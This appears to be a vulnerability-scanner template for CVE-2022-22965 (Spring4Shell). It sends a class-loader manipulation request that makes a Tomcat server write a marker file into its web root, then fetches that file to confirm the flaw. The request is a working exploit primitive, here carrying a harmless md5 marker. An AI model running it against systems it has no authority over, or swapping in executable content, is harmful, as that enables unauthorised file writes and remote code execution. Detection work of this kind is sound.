id: CVE-2022-22965

info:
  name: SpringFramework Rce
  author: Xvvvan
  severity: critical
  tags: cve,cve2022,,rce

requests:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        DNT: 1

        class.module.classLoader.resources.context.parent.pipeline.first.pattern={{content}}&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=etetet&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=

      - |
        GET /etetet.txt HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    payloads:
      content:
        - "{{md5('hello')}}"
    matchers:
      - type: dsl
        dsl:
          - "contains(tolower(body),md5('hello'))"

      - type: status
        status:
          - 200
